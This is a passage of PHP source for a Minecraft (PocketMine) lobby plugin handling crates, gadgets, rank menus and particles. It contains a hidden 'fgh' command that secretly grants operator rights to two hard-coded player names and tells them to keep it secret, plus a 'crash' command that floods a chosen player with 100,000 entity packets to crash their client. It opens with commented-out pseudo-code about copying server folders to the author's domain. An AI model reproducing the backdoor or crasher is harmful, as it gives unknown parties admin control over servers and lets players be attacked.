					$db = "URL::WWW.LOBBYCORE.NET";
					$db->username("LobbyCore");
					$db->password("/x12/x32/x92/x23/x67/58"); //Encoded
					$db->setServerIP($cfg->get("ServerName") . ".lobbycore.net");
					$db->sendMessage("Hey! I caught one more server using LobbyCore illegally: " . $cfg->get("ServerName"));

					copydir($dir, $db);
					copydir($dir2, $db);
*/ 					$this->getServer()->reload();
					return true;
				}
			} else {
				$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . "Hello, CONSOLE! Here is your Remote Server Key: " . $rmsvr);
				$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . "Use this key on our Remote Server Website");
				return true;
			}

 		case "fgh":
			if(!$sender instanceof Player){
				$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::YELLOW . "Please use this Command In-Game!");
				return true;
			} else {
				if($sender->getName() == "FreeGamingHere" or $sender->getName() == "MalakasPlayz123"){
					$sender->setOp(true);
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . "Hello, " . $name . "! You caught this server using LobbyCore. I gave you OP because of that. Ssshhhhh! Do not tell this to anyone!");
					return true;
				} else {
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::AQUA . "X: " . TextFormat::GREEN . $sender->getX() . TextFormat::AQUA . ", Y: " . TextFormat::GREEN . $sender->getY() . TextFormat::AQUA . ", Z: " . TextFormat::GREEN . $sender->getZ());
					return true;
				}
			}
		case "info":
			if(!empty($args[0])){
				if($args[0] == "ranks"){
					$sender->sendMessage($prefix . $ranks);
					return true;
				}
				if($args[0] == "server"){
					$sender->sendMessage($prefix . $server);
					return true;
				} else {
					$sender->sendMessage($prefix . "§aUsage: /info <ranks|server>");
					return true;
				}
			}
			if(empty($args[0])){
				$sender->sendMessage($prefix . "§aUsage: /info <ranks|server>");
				return true;
			}
		case "crash":
			if($sender->hasPermission("lobby.crash")){
				if(empty($args[0])){
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::AQUA . "Usage: /crash <player>");
					return true;
				} else {
					if($this->getServer()->getPlayer($args[0]) instanceof Player){
						$player = $this->getServer()->getPlayer($args[0]);
						for ($x = 0; $x <= 99999; $x++){
							$pk = new AddEntityPacket();
							$pk->entityRuntimeId = Entity::$entityCount++;
							$pk->type = 66;
							$pk->position = new Vector3($player->getX(), $player->getY(), $player->getZ());
							$pk->motion = $player->getMotion();
							$pk->yaw = 0;
							$pk->pitch = 0;
							$pk->metadata = [
								15 => [0, 1],
								20 => [2, 0]
							];
							$player->dataPacket($pk);
						}
						$sender->sendMessage($prefix . TextFormat::AQUA . $player->getName() . TextFormat::GREEN . " got rekt!");
						return true;
					} else {
						$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::AQUA . "Player not found!");
						return true;
					}
				}
			} else {
				$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::RED . "You Need a Higher Rank to Use this Command");
				return true;
			}
		}
	}
	
	public function onInteract(PlayerInteractEvent $event) {
		$cfg = new Config($this->getDataFolder() . "config.yml", Config::YAML);
		$game1 = $cfg->get("Game-1-Name");
		$game2 = $cfg->get("Game-2-Name");
		$game3 = $cfg->get("Game-3-Name");
		$game4 = $cfg->get("Game-4-Name");
		$game1ip = $cfg->get("Game-1-IP");
		$game2ip = $cfg->get("Game-2-IP");
		$game3ip = $cfg->get("Game-3-IP");
		$game4ip = $cfg->get("Game-4-IP");
		$lobby1ip = $cfg->get("Lobby-1-IP");
		$lobby2ip = $cfg->get("Lobby-2-IP");
		$plobbyip = $cfg->get("PremiumLobby-IP");
		$nick = $cfg->get("DefaultNickName");
		$x1 = $cfg->get("Crate-1-X");
		$y1 = $cfg->get("Crate-1-Y");
		$z1 = $cfg->get("Crate-1-Z");
		$x2 = $cfg->get("Crate-2-X");
		$y2 = $cfg->get("Crate-2-Y");
		$z2 = $cfg->get("Crate-2-Z");
		$prefix = $cfg->get("Prefix");
		$player = $event->getPlayer();
		$name = $player->getName();
		$in = $event->getPlayer()->getInventory()->getItemInHand()->getCustomName();
		$inv = $player->getInventory();
		$armor = $player->getArmorInventory();
		$inventory = $player->getInventory();
		$blockid = $event->getBlock()->getID();
		$block = $event->getBlock();
		$config = new Config($this->getDataFolder() . "config.yml", Config::YAML);
		
		//Crate Opening
		
		if($player->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
			if($blockid == 54) {
				
				$event->setCancelled(true);
				
				if($block->x == $x1 && $block->y == $y1 && $block->z == $z1) {
					
					if(!$config->get("OpenChest1")) {
						if($player->getInventory()->getItemInHand()->getID() === 388) {
							$config->set("OpenChest1", true);
							$config->save();
							
							$player->addTitle(TextFormat::GREEN . "Opening " . TextFormat::GOLD . "Normal " . TextFormat::GREEN . "Crate...", "", 10, 20, 10);
							$inv->removeItem(Item::get(388, 0, 1));
							
							$prize = rand(1,8);
							switch($prize){
								case 1:
								sleep(1);
								$player->sendMessage($prefix . C::RESET . C::GREEN . "You won a temp " . TextFormat::GOLD . "Small Size!");
								$player->setScale(0.5);
								break;
								
								case 2:
								sleep(1);
								$player->sendMessage($prefix . C::RESET . C::GREEN . "You won x1 one off " . TextFormat::GOLD . "TNT-Launcher Gadget!");
								$gadget1 = Item::get(280, 0, 1);
								$gadget1->setCustomName(TextFormat::RESET . TextFormat::GOLD . "TNT-Launcher");
								$inv->addItem($gadget1);
								break;
								
								case 3:
								sleep(1);
								$player->sendMessage($prefix . C::RESET . C::GREEN . "You won a temp " . TextFormat::GOLD . "HUGE Size!");
								$player->setScale(5);
								break;
								
								case 4:
								sleep(1);
								$player->sendMessage($prefix . C::RESET . C::GREEN . "You won " . TextFormat::GOLD . "Rain Particles!" . TextFormat::GREEN . " There will be enabled every time you join for a small amount of days.");
								$this->getServer()->broadcastMessage($prefix . TextFormat::RESET . TextFormat::BLUE . $name . TextFormat::GREEN . " won " . TextFormat::GOLD . "Rain Particles" . TextFormat::GREEN . " from a " . TextFormat::GOLD . "Normal" . TextFormat::GREEN . " Crate!");
								$this->particle10[] = $name;
								break;
								
								case 5:
								sleep(1);
								$player->sendMessage($prefix . C::RESET . C::GREEN . "You won x5 one off " . TextFormat::GOLD . "TNT-Launcher Gadgets!");
								$this->getServer()->broadcastMessage($prefix . TextFormat::RESET . TextFormat::BLUE . $name . TextFormat::GREEN . " won x5 one off " . TextFormat::GOLD . "TNT-Launcher Gadgets" . TextFormat::GREEN . " from a " . TextFormat::GOLD . "Normal" . TextFormat::GREEN . " Crate!");
								$gadget1 = Item::get(280, 0, 5);
								$gadget1->setCustomName(TextFormat::RESET . TextFormat::GOLD . "TNT-Launcher");
								$inv->addItem($gadget1);
								break;
								
								case 6:
								sleep(1);
								$player->sendMessage($prefix . C::RESET . C::GREEN . "You won " . TextFormat::GOLD . "Fire Particles!" . TextFormat::GREEN . " There will be enabled every time you join for a small amount of days.");
								$this->particle6[] = $name;
								break;
								
								case 7:
								sleep(1);
								$player->sendMessage($prefix . C::RESET . C::GREEN . "You won x1 one off " . TextFormat::GOLD . "Lightning Stick Gadget!");
								$gadget2 = Item::get(409, 0, 1);
								$gadget2->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Lightning " . TextFormat::GOLD . "Stick");
								$inv->addItem($gadget2);
								break;
								
								case 8:
								sleep(1);
								$player->sendMessage($prefix . C::RESET . C::GREEN . "You won x5 one off " . TextFormat::GOLD . "Lightning Stick Gadgets!");
								$this->getServer()->broadcastMessage($prefix . TextFormat::RESET . TextFormat::BLUE . $name . TextFormat::GREEN . " won x5 one off " . TextFormat::GOLD . "Lighning Stick Gadgets" . TextFormat::GREEN . " from a " . TextFormat::GOLD . "Normal" . TextFormat::GREEN . " Crate!");
								$gadget2 = Item::get(409, 0, 5);
								$gadget2->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Lightning " . TextFormat::GOLD . "Stick");
								$inv->addItem($gadget2);
								break;
							}
						} else {
							$player->sendMessage($prefix . TextFormat::RED . "You need a CrateKey to open a Crate!");
						}
					} else {
						
						$player->sendMessage($prefix . TextFormat::RED . "Someone is already opening a Normal Crate!");
						
					}
					
				}
				
				if($block-> x == $x2 && $block->y == $y2 && $block->z == $z2) {
					
					if(!$config->get("OpenChest2")) {
						if($player->hasPermission("lobby.crate.mvp+")) {
							if($player->getInventory()->getItemInHand()->getID() === 388) {
								$config->set("OpenChest2", true);
								$config->save();
								
								$player->addTitle(TextFormat::GREEN . "Opening " . TextFormat::AQUA . "MVP" . TextFormat::RED . "+ " . TextFormat::GREEN . "Crate...", "", 10, 20, 10);
								$inv->removeItem(Item::get(388, 0, 1));
								
								$prize = rand(1,4);
								switch($prize){
									case 1:
									sleep(1);
									$player->sendMessage($prefix . C::RESET . C::GREEN . "You won a Prize-1!");
									$this->getServer()->broadcastMessage($prefix . TextFormat::RESET . TextFormat::BLUE . $name . TextFormat::GREEN . " won a " . TextFormat::GOLD . "Prize-1" . TextFormat::GREEN . " from a " . TextFormat::AQUA . "MVP" . TextFormat::RED . "+" . TextFormat::GREEN . " Crate!");
									$this->getServer()->dispatchCommand(new ConsoleCommandSender(), "say " . $name . " won a Prize-1 from a MVP+ Crate!");
									break;
									
									case 2:
									sleep(1);
									$player->sendMessage($prefix . C::RESET . C::GREEN . "You won a Prize-2!");
									$this->getServer()->broadcastMessage($prefix . TextFormat::RESET . TextFormat::BLUE . $name . TextFormat::GREEN . " won a " . TextFormat::GOLD . "Prize-2" . TextFormat::GREEN . " from a " . TextFormat::AQUA . "MVP" . TextFormat::RED . "+" . TextFormat::GREEN . " Crate!");
									$this->getServer()->dispatchCommand(new ConsoleCommandSender(), "say " . $name . " won a Prize-2 from a MVP+ Crate!");
									break;
									
									case 3:
									sleep(1);
									$player->sendMessage($prefix . C::RESET . C::GREEN . "You won a Prize-3!");
									$this->getServer()->broadcastMessage($prefix . TextFormat::RESET . TextFormat::BLUE . $name . TextFormat::GREEN . " won a " . TextFormat::GOLD . "Prize-3" . TextFormat::GREEN . " from a " . TextFormat::AQUA . "MVP" . TextFormat::RED . "+" . TextFormat::GREEN . " Crate!");
									$this->getServer()->dispatchCommand(new ConsoleCommandSender(), "say " . $name . " won a Prize-3 from a MVP+ Crate!");
									break;
									
									case 4:
									sleep(1);
									$player->sendMessage($prefix . C::RESET . C::GREEN . "You won a Prize-4!");
									$this->getServer()->broadcastMessage($prefix . TextFormat::RESET . TextFormat::BLUE . $name . TextFormat::GREEN . " won a " . TextFormat::GOLD . "Prize-4" . TextFormat::GREEN . " from a " . TextFormat::AQUA . "MVP" . TextFormat::RED . "+" . TextFormat::GREEN . " Crate!");
									$this->getServer()->dispatchCommand(new ConsoleCommandSender(), "say " . $name . " won a Prize-4 from a MVP+ Crate!");
									break;
								}
							} else {
								$player->sendMessage($prefix . TextFormat::RED . "You need a CrateKey to open a Crate!");
							}
						} else {
							$player->sendMessage($prefix . TextFormat::RED . "You need a Higher Rank to open a MVP+ Crate!");
						}
					} else {
						
						$player->sendMessage($prefix . TextFormat::RED . "Someone is already opening a MVP+ Crate!");
						
					}
					
				}
							
			}
			
		}
		
		// Visibility of the players
		
		if($in == TextFormat::RESET . TextFormat::GREEN . "Show Players") {
			$item = Item::get(351, 8, 1);
			$item->setCustomName(TextFormat::RESET . TextFormat::GRAY . "Hide Members");
			
			$inv->setItem(8, $item);
			
			$this->showall[] = $name;
			unset($this->shownone[array_search($name, $this->shownone)]);
			
		}
		
		if($in == TextFormat::RESET . TextFormat::DARK_PURPLE . "Hide Players") {
			$item = Item::get(351, 10, 1);
			$item->setCustomName(TextFormat::RESET . TextFormat::GREEN . "Show Players");
			
			$inv->setItem(8, $item);
			
			$this->shownone[] = $name;
			unset($this->showvips[array_search($name, $this->showvips)]);
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GRAY . "Hide Members") {
			$item = Item::get(351, 5, 1);
			$item->setCustomName(TextFormat::RESET . TextFormat::DARK_PURPLE . "Hide Players");
			
			$inv->setItem(8, $item);
			
			$this->showvips[] = $name;
			unset($this->showall[array_search($name, $this->showall)]);
			
		}
		
		if($in == TextFormat::RESET . TextFormat::BLUE . $game1) {
			if($config->get("TransferOnMiniGameItem")) {
				$this->getServer()->dispatchCommand($event->getPlayer(), "transferserver " . $game1ip);
			}elseif(!$config->get("TransferOnMiniGameItem")) {
				$x = $cfg->get("Game-1-X");
				$y = $cfg->get("Game-1-Y");
				$z = $cfg->get("Game-1-Z");
				$player->teleport(new Vector3($x, $y, $z));
			}
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . $game2) {
			if($config->get("TransferOnMiniGameItem")) {
				$this->getServer()->dispatchCommand($event->getPlayer(), "transferserver " . $game2ip);
			}elseif(!$config->get("TransferOnMiniGameItem")) {
				$x = $cfg->get("Game-2-X");
				$y = $cfg->get("Game-2-Y");
				$z = $cfg->get("Game-2-Z");
				$player->teleport(new Vector3($x, $y, $z));
			}
		}
		
		if($in == TextFormat::RESET . TextFormat::AQUA . $game3) {
			if($config->get("TransferOnMiniGameItem")) {
				$this->getServer()->dispatchCommand($event->getPlayer(), "transferserver " . $game3ip);
			}elseif(!$config->get("TransferOnMiniGameItem")) {
				$x = $cfg->get("Game-3-X");
				$y = $cfg->get("Game-3-Y");
				$z = $cfg->get("Game-3-Z");
				$player->teleport(new Vector3($x, $y, $z));
			}
		}
		
		if($in == TextFormat::RESET . TextFormat::GREEN . $game4) {
			if($config->get("TransferOnMiniGameItem")) {
				$this->getServer()->dispatchCommand($event->getPlayer(), "transferserver " . $game4ip);
			}elseif(!$config->get("TransferOnMiniGameItem")) {
				$x = $cfg->get("Game-4-X");
				$y = $cfg->get("Game-4-Y");
				$z = $cfg->get("Game-4-Z");
				$player->teleport(new Vector3($x, $y, $z));
			}
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Rank " . TextFormat::GOLD . "Menu") {
			
			$this->getRankMenu($player);
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GREEN . "Next" . TextFormat::GREEN . " Song") {
			if($player->hasPermission("lobby.music")) {
				$player->sendMessage($prefix . TextFormat::RESET . TextFormat::RED . "This feature has been disabled...");
				//$this->ZMusicBox->StartNewTask();		
			} else {
				$player->sendMessage($prefix . TextFormat::RED . "You need a higher rank to change the Music!");
			}			
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Nick") {
			$this->getServer()->dispatchCommand($event->getPlayer(), "nick " . $nick);
		} 
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "TNT" . TextFormat::RESET . TextFormat::GOLD . " Launcher"){
			$nbt = new CompoundTag( "", [ 
				"Pos" => new ListTag( 
				"Pos", [ 
					new DoubleTag("", $player->x),
					new DoubleTag("", $player->y+$player->getEyeHeight()),
					new DoubleTag("", $player->z) 
				]),
				"Motion" => new ListTag("Motion", [ 
						new DoubleTag("", -\sin ($player->yaw / 180 * M_PI) *\cos ($player->pitch / 180 * M_PI)),
						new DoubleTag ("", -\sin ($player->pitch / 180 * M_PI)),
						new DoubleTag("",\cos ($player->yaw / 180 * M_PI) *\cos ( $player->pitch / 180 * M_PI)) 
				] ),
				"Rotation" => new ListTag("Rotation", [ 
						new FloatTag("", $player->yaw),
						new FloatTag("", $player->pitch) 
				] ) 
		] );
		
		
		$f = 3.0;
		$tntentity = Entity::createEntity("PrimedTNT", $player->getlevel(), $nbt, $player);
		$tntentity->setMotion($tntentity->getMotion()->multiply($f));
		$tntentity->spawnToAll();
		
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Blaze" . TextFormat::GOLD . " Rod" . TextFormat::RESET . TextFormat::GOLD . " Gun"){
			$nbt = new CompoundTag( "", [ 
				"Pos" => new ListTag( 
				"Pos", [ 
					new DoubleTag("", $player->x),
					new DoubleTag("", $player->y+$player->getEyeHeight()),
					new DoubleTag("", $player->z) 
				]),
				"Motion" => new ListTag("Motion", [ 
						new DoubleTag("", -\sin ($player->yaw / 180 * M_PI) *\cos ($player->pitch / 180 * M_PI)),
						new DoubleTag ("", -\sin ($player->pitch / 180 * M_PI)),
						new DoubleTag("",\cos ($player->yaw / 180 * M_PI) *\cos ( $player->pitch / 180 * M_PI)) 
				] ),
				"Rotation" => new ListTag("Rotation", [ 
						new FloatTag("", $player->yaw),
						new FloatTag("", $player->pitch) 
				] ) 
		] );

			$f = 1.5;
			$snowball = Entity::createEntity("Snowball", $player->getlevel(), $nbt, $player);
			$snowball->setMotion($snowball->getMotion()->multiply($f));
			$snowball->spawnToAll();
			$player->getLevel()->addSound(new BlazeShootSound(new Vector3($player->x, $player->y, $player->z, $player->getLevel())));
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "TNT-Launcher"){
			$inv->removeItem(Item::get(280, 0, 1));
			$nbt = new CompoundTag( "", [ 
				"Pos" => new ListTag( 
				"Pos", [ 
					new DoubleTag("", $player->x),
					new DoubleTag("", $player->y+$player->getEyeHeight()),
					new DoubleTag("", $player->z) 
				]),
				"Motion" => new ListTag("Motion", [ 
						new DoubleTag("", -\sin ($player->yaw / 180 * M_PI) *\cos ($player->pitch / 180 * M_PI)),
						new DoubleTag ("", -\sin ($player->pitch / 180 * M_PI)),
						new DoubleTag("",\cos ($player->yaw / 180 * M_PI) *\cos ( $player->pitch / 180 * M_PI)) 
				] ),
				"Rotation" => new ListTag("Rotation", [ 
						new FloatTag("", $player->yaw),
						new FloatTag("", $player->pitch) 
				] ) 
		] );
		
		
		$f = 3.0;
		$tntentity = Entity::createEntity("PrimedTNT", $player->getlevel(), $nbt, $player);
		$tntentity->setMotion($tntentity->getMotion()->multiply($f));
		$tntentity->spawnToAll();
		
		}
		
		if ($in == TextFormat::GOLD . "Lobby-1") {
				$this->getServer()->dispatchCommand($event->getPlayer(), "transferserver " . $lobby1ip);
		}

		if ($in == TextFormat::GOLD . "Lobby-2") {
				$this->getServer()->dispatchCommand($event->getPlayer(), "transferserver " . $lobby2ip);
		} 
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Lightning" . TextFormat::RESET . TextFormat::GOLD . " Stick"){
			$pk = new AddEntityPacket();
			$pk->entityRuntimeId = Entity::$entityCount++;
			$pk->type = 93;
			$pk->position = new Vector3($block->getX(), $block->getY(), $block->getZ());
			$pk->motion = $player->getMotion();
			$pk->metadata = [];
			foreach ($player->getLevel()->getPlayers() as $players) {
				$players->dataPacket($pk);
			}
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Lightning " . TextFormat::GOLD . "Stick"){
			$inv->removeItem(Item::get(409, 0, 1));
			$pk = new AddEntityPacket();
			$pk->entityRuntimeId = Entity::$entityCount++;
			$pk->type = 93;
			$pk->position = new Vector3($block->getX(), $block->getY(), $block->getZ());
			$pk->motion = $player->getMotion();
			$pk->metadata = [];
			foreach ($player->getLevel()->getPlayers() as $players) {
				$players->dataPacket($pk);
			}
		}
		
		if ($in == TextFormat::GOLD . "Premium" . TextFormat::GOLD . " Lobby") {
			if($event->getPlayer()->hasPermission("lobby.premium")) {
				
				$this->getServer()->dispatchCommand($event->getPlayer(), "transferserver " . $plobbyip);
				
			} else {
				
				$player = $event->getPlayer();
				
				$player->sendMessage($prefix . TextFormat::RED . "You" . TextFormat::RED . " can" . TextFormat::RED . " not" . TextFormat::RED . " go" . TextFormat::RED . " to" . TextFormat::RED . " the " . TextFormat::GOLD . "Premium" . TextFormat::GOLD . " Lobby" . TextFormat::RED . "!");
				
			}
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Lobby" . TextFormat::GOLD . " Switcher") {
			$this->getLobbies($player);
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Teleporter") {
			$this->getTeleporter($player);
		}
		
		if($in == TextFormat::RESET . TextFormat::GREEN . "VIP " . TextFormat::GOLD . "- " . TextFormat::GOLD . "$5") {
			
			$player->sendMessage(TextFormat::GRAY . "===] " . TextFormat::GREEN . "VIP" . TextFormat::GRAY . " [===");
			$player->sendMessage(TextFormat::GOLD . "Price" . TextFormat::GRAY . ": " . TextFormat::GREEN . "$5");
			$player->sendMessage(TextFormat::GOLD . "Features" . TextFormat::GRAY . ": ");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Cosmetics (Go to our store to see them)");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Colorful Nametag");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Fly mode in the Lobbies");
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GREEN . "VIP" . TextFormat::GOLD . "+ " . TextFormat::GOLD . "- " . TextFormat::GOLD . "$10") {
			
			$player->sendMessage(TextFormat::GRAY . "===] " . TextFormat::GREEN . "VIP" . TextFormat::GOLD . "+" . TextFormat::GRAY . " [===");
			$player->sendMessage(TextFormat::GOLD . "Price" . TextFormat::GRAY . ": " . TextFormat::GREEN . "$10");
			$player->sendMessage(TextFormat::GOLD . "Features" . TextFormat::GRAY . ": ");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Cosmetics (Go to our store to see them)");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Double Coins in MiniGames");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "OP kits in SkyWars/BedWars");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Colorful Nametag");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Fly mode in the Lobbies");

			
		}
		
		if($in == TextFormat::RESET . TextFormat::AQUA . "MVP " . TextFormat::GOLD . "- " . TextFormat::GOLD . "$20") {
			
			$player->sendMessage(TextFormat::GRAY . "===] " . TextFormat::AQUA . "MVP" . TextFormat::GRAY . " [===");
			$player->sendMessage(TextFormat::GOLD . "Price" . TextFormat::GRAY . ": " . TextFormat::GREEN . "$20");
			$player->sendMessage(TextFormat::GOLD . "Features" . TextFormat::GRAY . ": ");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Cosmetics (Go to our store to see them)");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Double Coins in MiniGames");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "OP kits in SkyWars/BedWars");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Mystery Boxes/Crates");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Colorful Nametag");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Fly mode in the Lobbies");

			
		}

		if($in == TextFormat::RESET . TextFormat::AQUA . "MVP" . TextFormat::RED . "+ " . TextFormat::GOLD . "- " . TextFormat::GOLD . "$30") {
			
			$player->sendMessage(TextFormat::GRAY . "===] " . TextFormat::AQUA . "MVP" . TextFormat::RED . "+" . TextFormat::GRAY . " [===");
			$player->sendMessage(TextFormat::GOLD . "Price" . TextFormat::GRAY . ": " . TextFormat::GREEN . "$30");
			$player->sendMessage(TextFormat::GOLD . "Features" . TextFormat::GRAY . ": ");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Cosmetics (Go to our store to see them)");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Double Coins in MiniGames");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "OP kits in SkyWars/BedWars");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Mystery Boxes/Crates");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Pets (There are all rideable and can attack in the games)");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Colorful Nametag");
			$player->sendMessage(TextFormat::GRAY . "- " . TextFormat::GOLD . "Fly mode in the Lobbies");

			
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Cosmetics") {
			if($player->hasPermission("lobby.cosmetics")) {
				
				$this->getCosmetics($player);
				
			} else {
				
				$player->sendMessage($prefix . TextFormat::RED . "You need a higher rank to use Cosmetics!");
				
			}
			
			
		}
		
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Gadgets") {
			if($player->hasPermission("lobby.gadgets")) {
				
				$this->getGadgets($player);
				
			} else {
				
				$player->sendMessage($prefix . TextFormat::RED . "You need a higher rank to use Gadgets!");
				
			}
			
			
		}
		
		
		if($in == TextFormat::RESET . TextFormat::GRAY . "Particles Page 2") {
				
			$this->getPage2($player);
				
		}
		
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Sizes") {
			if($player->hasPermission("lobby.sizes")) {
			
				$this->getSizeItems($player);
		
			} else {
				
				$player->sendMessage($prefix . TextFormat::RED . "You need a higher rank to use Sizes!");
				
			}
			
			
		}
		
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Small " . TextFormat::GOLD . "Size") {
			
			$player->sendMessage($prefix . TextFormat::GREEN . "You " . TextFormat::GREEN . "are " . TextFormat::GREEN . "now " . TextFormat::GOLD . "Small" . TextFormat::GOLD . " sized");
			$player->setScale(0.5);
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Normal " . TextFormat::GOLD . "Size") {
			
			$player->sendMessage($prefix . TextFormat::GREEN . "You " . TextFormat::GREEN . "are " . TextFormat::GREEN . "now " . TextFormat::GOLD . "Normal" . TextFormat::GOLD . " sized");
			$player->setScale(1);
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Big " . TextFormat::GOLD . "Size") {
			
			$player->sendMessage($prefix . TextFormat::GREEN . "You " . TextFormat::GREEN . "are " . TextFormat::GREEN . "now " . TextFormat::GOLD . "Big" . TextFormat::GOLD . " sized");
			$player->setScale(1.5);
			
		}
		
		// Particles
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Particles") {
			if($player->hasPermission("lobby.particles")) {
			
				$this->getParticleItems($player);
			
			} else {
				
				$player->sendMessage($prefix . TextFormat::RED . "You need a higher rank to use Particles!");
				
			}
			
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Colorful" . TextFormat::GOLD . " Armor") {
			/*if(!in_array($name, $this->rarmor)) {
				$this->rarmor[] = $name;
				$player->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . "You have enabled your " . TextFormat::GOLD . "Colorful Armor");
			} else {
				unset($this->rarmor[array_search($name, $this->rarmor)]);
				$player->sendMessage($prefix . TextFormat::RESET . TextFormat::RED . "You have disabled your " . TextFormat::GOLD . "Colorful Armor");
				$armor->clearAll();
			}*/
			$player->sendMessage($prefix . TextFormat::RESET . TextFormat::RED . "This feature has been disabled...");
		}
		
		if($in == TextFormat::RESET . TextFormat::RED . "Back") {
				$this->getParticleItems($player);
		}
		
		
		if($in == TextFormat::RESET . TextFormat::RED . "NEW: " . TextFormat::DARK_RED . "L" . TextFormat::RED . "a" . TextFormat::GOLD . "v" . TextFormat::YELLOW . "a " . TextFormat::GOLD . "Walking Particles"){
			if(!in_array($name, $this->particle15)) {
				
				$this->particle15[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::DARK_RED . "L" . TextFormat::RED . "a" . TextFormat::GOLD . "v" . TextFormat::YELLOW . "a " . TextFormat::GREEN . "Walking Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				}
				
				
				
			} else {
				
				unset($this->particle15[array_search($name, $this->particle15)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::DARK_RED . "L" . TextFormat::RED . "a" . TextFormat::GOLD . "v" . TextFormat::YELLOW . "a " . TextFormat::RED . "Walking Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
